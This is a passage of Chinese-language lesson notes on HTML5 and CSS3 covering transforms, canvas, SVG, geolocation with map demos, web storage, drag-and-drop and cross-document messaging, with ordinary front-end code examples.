描述     linear 动画从头到尾的速度是相同的。   ease 默认。动画以低速开始，然后加快，在结束前变慢。   ease-in 动画以低速开始。   ease-out 动画以低速结束。   ease-in-out 动画以低速开始和结束。   cubic-bezier(n,n,n,n) 在 cubic-bezier 函数中自己的值。可能的值是从 0 到 1 的数值。     在谷歌浏览器里面需要加上-webkit- IE6,7,8,9不支持css3运动\n 拓展阅读\n CSS3动画简介  CSS3盒模型阴影\n box-shadow:inset x y blur spread color inset：投影方式 inset：内投影 outset：外投影 默认(不能设置) x、y：阴影偏移 blur：模糊半径（灰度） spread：扩展阴影半径 先扩展原有形状，再开始画阴影 color  CSS3盒模型倒影\n box-reflect 倒影\n 方向 above|below|left|right; 距离 渐变（可选）  CSS3其他盒模型\n box-sizing 盒模型解析模式 content-box 标准盒模型(和css2一样的计算) width/height=border+padding+content border-box 怪异盒模型width/height与设置的值一样 ，content减小   扩展阅读\n 学会使用css3的box-sizing布局   第十课 transform 2D转换  Css3平面转换方法\n translate() 移动 rotate() 旋转 scale() 缩放 skew() 翻转 matrix() 矩阵  transform:\n rotate() 旋转函数 (deg)  deg 度数  skew(X,Y) 倾斜函数 (deg)  skewX() skewY()  scale(X,Y) 缩放函数 (正数、负数和小数)  scaleX() scaleY()  translate(X,Y) 位移函数(px)  translateX() translateY()   rotate() 旋转方法\n 用于旋转元素角度 例：rotate(30deg) 把元素顺时针旋转 30 度  translate()位置方法\n 用于移动元素位置 例：translate(50px,100px)  把元素从左侧移动 50 像素，从顶端移动 100 像素。  其实有些类似于我们的相对定位  scale()尺寸方法\n 方法用于改变元素尺寸 例：scale(2,4)  把宽度转换为原始尺寸的 2 倍，把高度转换为原始高度的 4 倍   skew() 翻转方法\n 通过 skew()方法，元素翻转给定的角度 例：transform: skew(30deg,20deg);  把元素围绕 X轴把元素翻转30 度，围绕 Y 轴翻转 20度    第十一课 transform 3D转换  Css3立体转换\n transform-style（preserve-3d） 建立3D空间（指定元素的子元素展示的场景是在3D场景还是平面(投影)场景） Perspective 视角（指定观察者与z=0平面的距离，从而让元素及子元素看起来有3D透视位置效果 值：集体的带单位数值） Perspective- origin 视角基点  值：取值类似于变换基准  transform-origin：坐标轴基点（变换基准）  值：具体的坐标值/百分比/(left/right/center/top/bottom) 默认 center center   transform 新增函数\n rotateX() rotateY() rotateZ() translateZ() scaleZ()   第十二课 视频音频  视频音频格式的简单介绍  常见的视频格式 视频的组成部分：画面、音频、编码格式 视频编码：H.264、Theora、VP8(google开源) 常见的音频格式 视频编码：ACC、MP3、Vorbis   HTML5支持的格式  HTML5能在完全脱离插件的情况下播放音视频,但是不是所有格式都支持。 支持的视频格式：  Ogg=带有Theora视频编码+Vorbis音频编码的Ogg文件 MEPG4=带有H.264视频编码+AAC音频编码的MPEG4文件 WebM=带有VP8视频编码+Vorbis音频编码的WebM格式   Video的使用  单独用法  \u0026lt;video src=\u0026quot;文件地址\u0026quot; controls=\u0026quot;controls\u0026quot;\u0026gt;\u0026lt;/video\u0026gt;  带提示用法  \u0026lt; video src=\u0026quot;文件地址\u0026quot; controls=\u0026quot;controls\u0026quot;\u0026gt; 您的浏览器暂不支持video标签。播放视频 \u0026lt;/ video \u0026gt;   兼容用法  \u0026lt; video controls=\u0026quot;controls\u0026quot; width=\u0026quot;300\u0026quot;\u0026gt; \u0026lt;source src=\u0026quot;move.ogg\u0026quot; type=\u0026quot;video/ogg\u0026quot; \u0026gt; \u0026lt;source src=\u0026quot;move.mp4\u0026quot; type=\u0026quot;video/mp4\u0026quot; \u0026gt; 您的浏览器暂不支持video标签。播放视频 \u0026lt;/ video \u0026gt;   Video的常见属性     属性 值 描述     Autoplay Autoplay 视频就绪自动播放   controls controls 向用户显示播放控件   Width Pixels(像素) 设置播放器宽度   Height Pixels(像素) 设置播放器高度   Loop Loop 播放完是否继续播放该视频，循环播放   Preload load{auto,meta,none} 规定是否预加载视频。   Src url 视频url地址   Poster Imgurl 加载等待的画面图片   Autobuffer Autobuffer 设置为浏览器缓冲方式，不设置autoply才有效     Video的API方法     方法 属性 事件     play() currentSrc play   pause() currentTime pause   load() videoWidth progress   canPlayType() videoHeight error    第十三课 canvas  标签 \u0026lt;canvas\u0026gt;  不支持canvas 的浏览器可以看到的内容 默认宽度300px，默认高度150px 注意：canvas宽高需要设置在标签中 否则绘制的东西可能出错  \u0026lt;canvas\u0026gt; 绘制环境  getContext(\u0026quot;2d\u0026quot;);目前支持2d的场景    \u0026lt;canvas width=\u0026quot;\u0026quot; height=\u0026quot;\u0026quot; id=\u0026quot;\u0026quot;\u0026gt; 您的浏览器不支持canvas，请更换浏览器！ \u0026lt;/canvas\u0026gt;   绘制矩形\n rect(L,T,W,H):创建一个矩形 fillRect(L,T,W,H):绘制填充的矩形 clearRect(x,y,w,h) 清除矩形选区 strokeRect(L,T,W,H)绘制空心矩形(无填充) 默认一像素黑色边框   设置绘图样式\n fillStyle:填充颜色(绘制canvas是有顺序的) lineWidth:触笔宽度(线宽) strokeStyle:触笔颜色  绘制路径\n beginPath() :开始路径 closePath():结束路径 moveTo(x,y):将触笔移动到x,y点 lineTo(x,y):绘制到x,y点 stroke(): 触笔方法 画线 默认为黑色 fill():填充方法 rect(x,y,w,h):矩形路径 save():保存路径 restore():恢复路径  绘制曲线\n arcTo(x1,y1,x2,y2,r)  x1,y1 坐标一 x2,y2坐标二 r圆弧半斤  quadraticCurveTo(dx,dy,x1,y1)  贝塞尔曲线:dx,dy控制点 x1,y1结束坐标  bezierCurveTo(dx1,dy1,dx2,dy2,x1,y1)  贝塞尔曲线:dx1,dy1 控制点一 dx2,dy2控制点二 x1,y1结束坐标   绘制圆形\n arc(x,y,半径,起始弧度,结束弧度,旋转方向) x，y起始位置 弧度与角度：弧度=角度值*Math.PI/180 旋转方向：顺时针（默认：false），逆时针（true）  绘制文本\n strokeText(文本,x,y); 绘制空心文本 fillText(文本,x,y); 绘制实心文本 font = \u0026quot;font-size font-family\u0026quot;注:尺寸 字体缺一不可 textAlign = \u0026quot;\u0026quot;;文本左右对齐方式 start center end left right textBaseline文本上下对齐方式  alphabetic默认。文本基线是普通的字母基线。 top 文本基线是 em 方框的顶端。。 hanging 文本基线是悬挂基线。 middle 文本基线是em 方框的正中。 ideographic 文本基线是表意基线。 bottom 文本基线是 em 方框的底端。 measureText(文本).width; 文本实际宽度(只有宽度值)   图形边界样式\n lineJoin: 边界连接点样式  miter(默认值),round(圆角),bevel(斜角)  lineCap: 端点样式  butt(默认值),round(圆角),square(高度多出线宽一半)   绘制图片\n 图片预加载，获取图片文件 onload中调用 drawImage(img,x,y,w,h);绘制图片(图片,坐标x,坐标y,宽度,高度)\n 设置背景\n createPattern(img,平铺方式)\n 平铺方式:repeat,repeat-x,repeat-y,no-repeat\n  canvas变换\n translate(x,y) 坐标基准点偏移 : 从起始点为基准，移动到当前位置  rotate(弧度): 旋转 弧度公式 = 角度*PI/180 scale(wb,hb)缩放比例(缩放canvas绘制的图片)   颜色渐变\n 线性渐变:createLinearGradient(x1,y1,x2,y2)  x1,y1起始坐标点 x2,y2结束坐标点  径向渐变:createRadialGradient(x1,y1,r1,x2,y2,r2)  x1,y1,r1内圆坐标及半径 x2,y2,r2外圆坐标及半径 addColorStop(位置,颜色) 位置:渐变点 0-1之间 可多个    阴影\n shadowOffsetX,shadowOffsetY x轴、y轴偏移 shadowBlur 阴影模糊度 shadowColor 阴影颜色 默认颜色:rgba(0,0,0,0)  像素\n createImageData(sx,sy) 创建新的、空白的 ImageData 对象 getImageData(x1,y1,sx,sy) 返回ImageData对象，该对象为画布上指定的矩形复制像素数据putImageData(img,x2,y2) 把图像数据（从指定的 ImageData 对象）放回画布上  合成\n globalAlpha 设置或返回绘图的当前alpha或透明值 globalCompositeOperation 设置或返回新图像如何绘制到已有的图像上 source-over默认。在目标图像上显示源图像。 source-atop在目标图像顶部显示源图像。源图像位于目标图像之外的部分是不可见的。 source-in 在目标图像中显示源图像。只有目标图像内的源图像部分会显示，目标图像是透明的。 source-out在目标图像之外显示源图像。只会显示目标图像之外源图像部分，目标图像是透明的。 destination-over在源图像上方显示目标图像。 destination-atop在源图像顶部显示目标图像。源图像之外的目标图像部分不会被显示。 destination-in在源图像中显示目标图像。只有源图像内的目标图像部分会被显示，源图像是透明的。 destination-out在源图像外显示目标图像。只有源图像外的目标图像部分会被显示，源图像是透明的。 lighter显示源图像 + 目标图像。 copy显示源图像。忽略目标图像。 xor使用异或操作对源图像与目标图像进行组合。  扩展阅读\n canvas学习之API整理笔记（一） HTML5 API大盘点   第十四课 SVG绘图  svg是什么\n 矢量图 与canvas的区别   svg的引入方式\n 方式一：    \u0026lt;?xml version=\u0026quot;1.1\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;!DOCTYPE svg PUBLIC \u0026quot;-//W3C//DTD SVG 1.1//EN\u0026quot; \u0026quot;http://www.w3.org/ Graphics/SVG/1.1/DTD/svg11.dtd\u0026quot;\u0026gt; \u0026lt;svg xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u0026gt;\u0026lt;/svg\u0026gt;   方式二：  图片、背景、框架  方式三:\n html页面中添加svg  circle:圆形\n 圆心坐标 cx,cy 半径 r fill stroke stroke-width stlye样式 fill = \u0026quot;none/transparent\u0026quot;  ellipse:椭圆\n cx属性定义的椭圆中心的x坐标 cy属性定义的椭圆中心的y坐标 rx属性定义的水平半径 ry属性定义的垂直半径  rect : 矩形\n width height 宽高\n 坐标 x,y 圆角 rx,ry  line:线条\n x1,y1,x2,y2 stroke-opacity 透明 fill-opacity  polyline:折线\n points:点坐标（x1 y1 x2 y2...）或(x1,y1,x2,y2....)\n  polygon:多边形\n 折线闭合 fill-rule:evenodd/nonzero;  path: 路劲\n d属性 M(起始坐标),L(结束坐标),H(水平线),V(垂直线),A(圆弧),Z(闭合路劲)  C,S,Q,T 贝塞尔曲线 大写为绝对坐标(具体的坐标位置) 小写为相对坐标(相对起始坐标点的具体长度)  A命令  x半径 y半径 角度 弧长(0 小弧 1大弧) 方向(0逆时针 1顺时针) 终点(x y)   C命令：三次贝塞尔曲线\n (x1,y1,x2,y2,x,y) x1,y1控制点一 x2,y2控制点二 x,y结束点  S命令：平滑贝塞尔曲线(自动对称一个控制点)\n (x2,y2,x,y) x2,y2控制点 x,y结束点  Q命令：二次贝塞尔曲线\n (x1,y1,x,y) x1,y1控制点 x,y结束点  T命令：一次贝塞尔曲线\n (x,y)结束点  g标签:组合元素 设置元素公共属性\n 共用属性 transform = \u0026quot;translate(0,0)\u0026quot;  text标签\n x, y, text-anchor(对齐start end middle) font-size  image 标签\n x, y, width height xlink:href(图片地址)   第十五课 地理信息与本地存储 地理位置  经度 : 南北极的连接线 纬度 : 东西连接的线\n 位置信息从何而来\n IP地址 GPS全球定位系统 Wi-Fi无线网络 基站  avigator.geolocation\n 单次定位请求 ：getCurrentPosition(请求成功,请求失败,数据收集方式) 请求成功函数 经度 : coords.longitude 纬度 : coords.latitude 准确度 : coords.accuracy 海拔 : coords.altitude 海拔准确度 : coords.altitudeAcuracy 行进方向 : coords.heading 地面速度 : coords.speed 请求的时间: new Date(position.timestamp)\n 请求失败函数\n 失败编号 ：code\n 0 : 不包括其他错误编号中的错误 1 : 用户拒绝浏览器获取位置信息 2 : 尝试获取用户信息，但失败了 3 : 设置了timeout值，获取位置超时了  数据收集 : json的形式\n enableHighAcuracy : 更精确的查找，默认false timeout : 获取位置允许最长时间，默认infinity maximumAge : 位置可以缓存的最大时间，默认0  多次定位请求* : watchPosition\n 移动设备有用，位置改变才会触发 配置参数：frequency 更新的频率 关闭更新请求 : clearWatch   examp01 getCurrentPosition\n  \u0026lt;button id=\u0026quot;btn\u0026quot;\u0026gt;请求位置信息\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026quot;box\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;  var btn = document.getElementById(\u0026quot;btn\u0026quot;); var box = document.getElementById(\u0026quot;box\u0026quot;); btn.onclick = function(){ navigator.geolocation.getCurrentPosition(function(position){ box.innerHTML +=\u0026quot;经度：\u0026quot;+position.coords.longitude + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;纬度：\u0026quot;+position.coords.latitude + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;海拔：\u0026quot;+position.coords.accuracy + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;海拔的准确度：\u0026quot;+position.coords.altitudeAccuracy + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;地面速度\u0026quot;+position.coords.speed + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;行进方向\u0026quot;+position.coords.heading + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;请求时间\u0026quot;+new Date(position.timestamp) + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; },function(err){ alert(err.code); },{ enableHighAccuracy:false,//精确请求 timeout:5000,//设置超时 maximumAge:1000//缓存时间 }); }  在线演示\n examp02  var btn = document.getElementById(\u0026quot;btn\u0026quot;); var box = document.getElementById(\u0026quot;box\u0026quot;); btn.onclick = function(){ navigator.geolocation.watchPosition(function(position){ box.innerHTML +=\u0026quot;经度：\u0026quot;+position.coords.longitude + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;纬度：\u0026quot;+position.coords.latitude + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;海拔：\u0026quot;+position.coords.accuracy + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;海拔的准确度：\u0026quot;+position.coords.altitudeAccuracy + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;地面速度\u0026quot;+position.coords.speed + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;行进方向\u0026quot;+position.coords.heading + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; box.innerHTML +=\u0026quot;请求时间\u0026quot;+new Date(position.timestamp) + \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; },function(err){ alert(err.code); },{ enableHighAccuracy:false,//精确请求 timeout:5000,//设置超时 maximumAge:1000//缓存时间 }); }  在线演示\n example03 高德地图应用  #container { width:600px; height: 300px; margin:40px auto; border:1px solid red; }  \u0026lt;div id=\u0026quot;container\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;http://webapi.amap.com/maps?v=1.3\u0026amp;key=278b7b8b4728ba302b7e566fc2a97b36\u0026quot;\u0026gt; \u0026lt;/script\u0026gt;  var map = new AMap.Map('container');  在线演示\n examp04 搜索城市  #container {width:500px; height:500px; margin:100px auto;} .menu{ width:100px; box-shadow: 0 0 5px #000; margin:auto; background:#fff; } .menu ul li{ list-style:none; line-height:30px; text-align:center; cursor:pointer; } #box{ width:400px; height:40px; position:absolute; top:150px; left:50%; margin-left:-200px; background:#fff; box-shadow:0 0 10px #000; } input{ height:38px; width:300px; border:none; outline:none; } #btn{ width:80px; }  \u0026lt;div id=\u0026quot;container\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;box\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; id=\u0026quot;city\u0026quot; placeholder=\u0026quot;请输入城市...\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;搜索\u0026quot; id=\u0026quot;btn\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;http://webapi.amap.com/maps?v=1.3\u0026amp;key=278b7b8b4728ba302b7e566fc2a97b36\u0026quot;\u0026gt; \u0026lt;/script\u0026gt;  var btn = document.getElementById(\u0026quot;btn\u0026quot;); var city = document.getElementById(\u0026quot;city\u0026quot;); var map = new AMap.Map('container'); var toolBar,mouseTool,contextMenu; //在地图中添加操作toolBar插件、mouseTool插件 map.plugin([\u0026quot;AMap.ToolBar\u0026quot;,\u0026quot;AMap.MouseTool\u0026quot;],function(){ toolBar = new AMap.ToolBar(); map.addControl(toolBar); mouseTool = new AMap.MouseTool(map); }); var menuContext = document.createElement(\u0026quot;div\u0026quot;); menuContext.innerHTML = \u0026quot;\u0026lt;div class=menu\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li onclick='zoomMenu(0)'\u0026gt;缩小\u0026lt;/li\u0026gt; \u0026lt;li onclick='zoomMenu(1)'\u0026gt;放大\u0026lt;/li\u0026gt; \u0026lt;li onclick='distanceMeasureMenu()'\u0026gt;距离量测\u0026lt;/li\u0026gt; \u0026lt;li onclick = 'addMarkerMenu()'\u0026gt;添加标记\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt;\u0026quot;; //创建一个自定义的右键菜单 contextMenu = new AMap.ContextMenu({isCustom:true,content:menuContext}); //给地图绑鼠标右键功能弹出右键菜单 AMap.event.addListener(map,\u0026quot;rightclick\u0026quot;,function(e){ contextMenu.open(map,e.lnglat);//e.lnglat鼠标点击的经纬度 contextMenuPosition = e.lnglat; }) //右键菜单缩放地图 function zoomMenu(n){ if(n === 0){map.zoomOut();} if(n === 1){map.zoomIn();} contextMenu.close(); } contextMenu.close(); //测量距离功能 function distanceMeasureMenu(){ mouseTool.rule(); contextMenu.close(); } //添加标注功能 function addMarkerMenu(){ mouseTool.close(); var marker = new AMap.Marker({ map: map, position: contextMenuPosition, //基点位置 offset: {x:-5,y:-10} //相对于基点位置 }); contextMenu.close(); } //搜索城市 btn.onclick = function(){ var val = city.value; map.setCity(val); }  在线演示\n本地存储  Storage\n sessionStorage  session临时回话，从页面打开到页面关闭的时间段 窗口的临时存储，页面关闭，本地存储消失  localStorage  永久存储（可以手动删除数据）    Storage的特点\n 存储量限制 ( 5M ) 客户端完成，不会请求服务器处理 sessionStorage数据是不共享、 localStorage共享   Storage API\n setItem():  设置数据，(key,value)类型，类型都是字符串 可以用获取属性的形式操作  getItem():  获取数据，通过key来获取到相应的value  removeItem():  删除数据，通过key来删除相应的value  clear():  删除全部存储的值    存储事件:\n 当数据有修改或删除的情况下，就会触发storage事件 在对数据进行改变的窗口对象上是不会触发的 Key : 修改或删除的key值，如果调用clear(),key为null newValue : 新设置的值，如果调用removeStorage(),key为null oldValue : 调用改变前的value值 storageArea : 当前的storage对象 url : 触发该脚本变化的文档的url 注：session同窗口才可以,例子：iframe操作   第十六课 HTML5新增JS方法  新增选择器\n document.querySelector() 选择单个元素 document.querySelectorAll() 选择所有的 document.getElementsByClassName() 通过类名选择  延迟加载JS\n JS的加载会影响后面的内容加载  很多浏览器都采用了并行加载JS，但还是会影响其他内容  Html5的defer和async  defer=“defer ”: 延迟加载，会按顺序执行，在onload执行前被触发 async =“async”: 异步加载，加载完就触发，有顺序问题  浏览器兼容性：Labjs库   /** * 动态加载script文件 （推荐方法） 只需请求一次 可加载多个JavaScript文件，减少请求次数以及页面的加载阻塞 */ function loadScript(url,callback){ var script = document.createElement(\u0026quot;script\u0026quot;); script.type = \u0026quot;text/javascript\u0026quot;; if(script.readyState){//IE script.onreadystatechange = function(){ if(script.readyState == \u0026quot;loaded\u0026quot; || script.readyState == \u0026quot;complete\u0026quot;){ onreadystatechange = null; callback(); } } }else { script.onload = function(){ callback(); } } script.src = url; document.getElementsByTagName(\u0026quot;head\u0026quot;)[0].appendChild(script); } loadScript(\u0026quot;js/defer.js\u0026quot;,function(){ console.log(\u0026quot;加载成功\u0026quot;); // 加载成功回调 }); loadScript(\u0026quot;js/async.js\u0026quot;,function(){ console.log(\u0026quot;加载成功\u0026quot;); // 加载成功回调 });   获取class列表属性\n classList  length : class的长度 add() : 添加class方法 remove() : 删除class方法 toggle() : 切换class方法 contains() : 判断类名是否存在返回bool值   JSON的新方法\n parse() : 把字符串转成json 字符串中的属性要严格的加上引号 stringify() : 把json转化成字符串 会自动的把双引号加上\n 与eval的区别\n eval()：对任何的字符串进行解析变成js\n parse()：字符串中的属性要严格的加上引号\n 其他浏览器兼容\n 去下载json2.js\n  历史管理\n onhashchange ：改变hash值来管理 history ： 服务器下运行  pushState : 三个参数 ：数据 标题(都没实现) 地址(可选) onpopstate事件 : 读取数据 event.state    第十七课 HTML5拖拽事件  图片自带拖拽功能 其他元素可设置draggable属性 draggable ：true\n 拖拽元素(被拖拽元素对象)事件 :\n ondragstart : 拖拽前触发 ondrag :拖拽前、拖拽结束之间，连续触发 ondragend :拖拽结束触发  目标元素(拖拽元素被拖到的对象)事件 :\n ondragenter :进入目标元素触发 ondragover:进入目标、离开目标之间，连续触发 ondragleave :离开目标元素触发 ondrop :在目标元素上释放鼠标触发  需要在ondragover事件里面阻止默认事件    拖拽兼容问题\n 火狐浏览器下需设置dataTransfer对象才可以拖拽除图片外的其他标签 dataTransfer对象 setData() : 设置数据 key和value(必须是字符串) getData() : 获取数据，根据key值，获取对应的value effectAllowed : 设置光标样式(none, copy, copyLink, copyMove, link, linkMove,move, all 和uninitialized)\n setDragImage ：三个参数（指定的元素，坐标X，坐标Y）\n files： 获取外部拖拽的文件，返回一个filesList列表\n filesList下有个type属性，返回文件的类型   读取文件信息\n FileReader(读取文件信息)  readAsDataURL  参数为要读取的文件对象  onload当读取文件成功完成的时候触发此事件 this. result 获取读取的文件数据   examp01 拖拽案例\n  \u0026lt;div id=\u0026quot;drap\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;box\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;  #drap { width: 100px; height: 100px; background: red; } #box { width: 500px; height: 500px; border: 2px solid blue; margin: 50px auto; }  //被拖拽元素事件 drap.ondragstart = function(ev){ // 拖拽前 var ev = ev || window.event; //火狐浏览器下需设置dataTransfer对象才可以拖拽除图片外的其他标签 ev.dataTransfer.setData(\u0026quot;key\u0026quot;,\u0026quot;poetries\u0026quot;); //effectAllowed : 设置光标样式(none, copy, copyLink, copyMove, link, linkMove,move, all 和uninitialized) ev.dataTransfer.effectAllowed = \u0026quot;copy\u0026quot;; //设置被拖拽的小元素 setDragImage ：三个参数（指定的元素，坐标X，坐标Y） ev.dataTransfer.setDragImage(pic,25,25); this.style.background = \u0026quot;green\u0026quot;; } drap.ondrag = function(){ // 拖拽过程中 this.innerText = \u0026quot;被拖拽中...\u0026quot;; } drap.ondragend = function(){ // 拖拽结束 this.style.background = \u0026quot;red\u0026quot;; this.innerHTML = \u0026quot;\u0026quot;; } //目标元素事件 box.ondragenter = function(){ //进入目标元素触发 this.innerHTML = \u0026quot;可将文件拖放到这里!\u0026quot;; } box.ondragover = function(ev){ //进入目标、离开目标之间，连续触发 var ev = ev || window.event; ev.preventDefault(); this.style.background = \u0026quot;pink\u0026quot;; } box.ondragleave = function(){ //离开目标元素触发 this.innerHTML = \u0026quot;\u0026quot;; this.style.background = \u0026quot;none\u0026quot;; } box.ondrop = function(ev){//在目标元素上释放鼠标触发 //alert(\u0026quot;拖放结束\u0026quot;) this.innerHTML = ev.dataTransfer.getData(\u0026quot;key\u0026quot;); }  在线演示\n example02 拖拽相册  \u0026lt;h1\u0026gt;请拖拽图片到红框中\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;box\u0026quot;\u0026gt;\u0026lt;span\u0026gt;可以将文件拖放到这里！！\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;dustbin\u0026quot;\u0026gt;垃圾回收站\u0026lt;/div\u0026gt;  #box{ position:relative; width:500px; height:500px; border:2px solid red; margin:100px auto 0px; } #box span{ position:absolute; left:0; top:0; right:0; bottom:0; height:50px; width:192px; margin:auto; display:none; } img{ width:100px;height:100px; } #dustbin{ width:200px; height:100px; background:#000; color:#fff; font-size:40px; text-align:center; line-height:100px; margin:auto; }  var box = document.getElementById(\u0026quot;box\u0026quot;); var dusTbin = document.getElementById(\u0026quot;dustbin\u0026quot;); var span = box.getElementsByTagName(\u0026quot;span\u0026quot;)[0]; //目标元素事件 var img = ''; box.ondragenter = function(){//进入目标元素触发 span.style.display = \u0026quot;block\u0026quot;; } box.ondragover = function(ev){//在目标元素上连续触发 var ev = ev||window.event; ev.preventDefault();//阻止默认事件 span.style.display = \u0026quot;block\u0026quot;; } box.ondragleave = function(){//离开目标元素 span.style.display = \u0026quot;none\u0026quot;; } box.ondrop = function(ev){//在目标元素上面释放鼠标触发 //alert(\u0026quot;拖拽结束！！\u0026quot;); var ev = ev||window.event; ev.preventDefault();//阻止默认事件 span.style.display = \u0026quot;none\u0026quot;; var file = ev.dataTransfer.files; //alert(file[0].type); for (var i=0; i\u0026lt;file.length ;i++ ) { if (file[i].type.indexOf(\u0026quot;image\u0026quot;)!=-1) { var read = new FileReader();//新建一个读取文件对象 read.readAsDataURL(file[i]);//读取文件 read.onload = function(){//读取文件成功之后调用什么函数 var img = document.createElement(\u0026quot;img\u0026quot;); //alert(this.result); img.src = this.result; box.appendChild(img); //获取img节点 实现删除功能 var oImg = document.getElementsByTagName(\u0026quot;img\u0026quot;); if (oImg) { for (var j=0;j\u0026lt;oImg.length ;j++ ) { oImg[j].ondragstart = function(ev){ ev.dataTransfer.setData(\u0026quot;data\u0026quot;,ev.target.innerHTML); img = ev.target; } oImg[j].ondragend = function(ev){ ev.dataTransfer.clearData(\u0026quot;data\u0026quot;);//清楚数据 img = null; } } } //实现删除功能(移除img节点) dusTbin.ondragover = function(ev){ ev.preventDefault(); } dusTbin.ondrop = function(){ if (img) { img.parentNode.removeChild(img); } } } }else{ alert(\u0026quot;请上传图片！\u0026quot;); } } }  在线演示\n example03 拖拽排序  \u0026lt;div class=\u0026quot;wrap\u0026quot; id=\u0026quot;wrap\u0026quot;\u0026gt; \u0026lt;ul id=\u0026quot;box\u0026quot;\u0026gt; \u0026lt;li style=\u0026quot;background:#f3f\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;1\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026quot;background:#ff6\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;2\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026quot;background:#c60\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;3\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026quot;background:#903\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;4\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026quot;background:#0f6\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;5\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026quot;background:#636\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;6\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026quot;background:#36f\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;7\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026quot;background:#033\u0026quot; draggable=\u0026quot;true\u0026quot;\u0026gt;8\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt;  .wrap{ width:500px; height:500px; margin:50px auto; } ul li{ list-style:none; width:500px; height:50px; color:#fff; text-align:center; line-height:50px; font-size:40px; font-weight:bold; }  var oUl = document.getElementById(\u0026quot;box\u0026quot;); var oLi = oUl.getElementsByTagName(\u0026quot;li\u0026quot;); var curr = 0; function sort(){ for (var i = 0;i \u0026lt; oLi.length;i++) { oLi[i].index = i; oLi[i].ondragstart = function(ev){ var ev = ev || window.event; ev.dataTransfer.setData(\u0026quot;data\u0026quot;,this.innerHTML); //this.innerHTML = \u0026quot;被拖拽中...\u0026quot;; curr = this.index; } oLi[i].ondragenter = function(){ for(var i = 0;i \u0026lt; oLi.length;i++){ oLi[i].style.border = \u0026quot;none\u0026quot;; } if(curr != this.index){ this.style.border = \u0026quot;2px solid #000\u0026quot;; } } oLi[i].ondragover = function(e){ var e = e || window.event; e.preventDefault(); } oLi[i].ondrop = function(ev){ //鼠标释放的时候 //oUl.insertBefore(oLi[curr],this);//insertBefore(新节点，目标节点) inserAfter(oLi[curr],this); this.style.border = \u0026quot;none\u0026quot;; //oLi[curr].innerHTML = ev.DataTransfer.getData(\u0026quot;data\u0026quot;); sort(); } } } sort(); function inserAfter(newItem,targerItem){ var parentItem = targerItem.parentNode; if(parentItem.lastChild == targerItem){ parentItem.appendChild(newItem); }else { parentItem.insertBefore(newItem,targerItem.nextSibling); } }  在线演示\n第十八课 跨文档操作  跨文档请求\n 同域跨文档\n iframe内页：  父页面操作子页面：contentWindow 子页面操作父页面：window.top(找到最顶级的父页面)/parent(第一父页面) 新窗口页：  父页面操作子页面：window.open 子页面操作父页面：window.opener     不同域跨文档\n postMessage（“发送的数据”,”接收的域”）  message事件监听 ev.origin发送数据来源的域 ev.data 发送的数据  通过判断发送的数据来执行相应的需求  ajax跨域\n XMLHttpRequest 新增功能\n 跨域请求：修改服务端头信息 IE兼容：XDomaiRequest   进度事件：\n upload.onprogress(ev) 上传进度(实现文件上传进度条)  ev.total 发送文件的总量 ev.loaded 已发送的量  FormData 构建提交二进制数据   拓展阅读\n HTML5 API 大盘点   附录一　css3响应式布局  媒体类型\n *all 所有媒体 braille 盲文触觉设备 embossed 盲文打印机 *print 手持设备 projection 打印预览 *screen 彩屏设备 speech \u0026lsquo;听觉\u0026rsquo;类似的媒体类型 tty不适用像素的设备 tv 电视  关键字\n and not not关键字是用来排除某种制定的媒体类型 only only用来定某种特定的媒体类型  媒体特性\n (max-width:600px) (max-device-width: 480px) 